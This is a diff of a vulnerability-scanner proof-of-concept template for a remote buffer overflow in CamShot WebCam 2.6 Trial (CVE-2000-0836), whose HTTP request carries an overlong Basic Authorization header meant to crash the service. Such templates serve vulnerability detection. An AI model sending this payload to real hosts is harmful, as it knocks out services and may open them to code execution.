@@ -1,17 +1,17 @@
 [info]
 author = "AVE"
-description = "向 CamShot WebCam 2.6 Trial 发送包含超长 Authorization 头部的 HTTP 请求，触发缓冲区溢出导致服务崩溃，验证漏洞存在性"
+description = "通过向 CamShot WebCam 2.6 Trial HTTP 服务发送超长 Authorization 头部（Basic 认证密码字段填充 325 个 'a' 字符），触发栈缓冲区溢出，导致服务崩溃或任意代码执行。远程攻击者无需身份认证即可利用。"
 id = "POC-AVE-2000-0622"
-name = "CamShot WebCam Trial 2.6 远程缓冲区溢出 PoC"
+name = "CamShot WebCam 2.6 Trial Remote Buffer Overflow PoC"
 severity = "high"
-tags = ["ave-2000-0622"]
+tags = ["cve-2000-0836"]
 vuln_id = [
     "CVE-2000-0836",
     "AVE-2000-0622",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
@@ -19,14 +19,14 @@ path = "/{{BaseURL}}/"
 protocol = "http"
 
 [poc.requests.headers]
-Authorization = "Basic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+Authorization = "Basic aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "Connection refused",
-    "Service Unavailable",
     "500",
+    "Service Unavailable",
+    "connection refused",
 ]
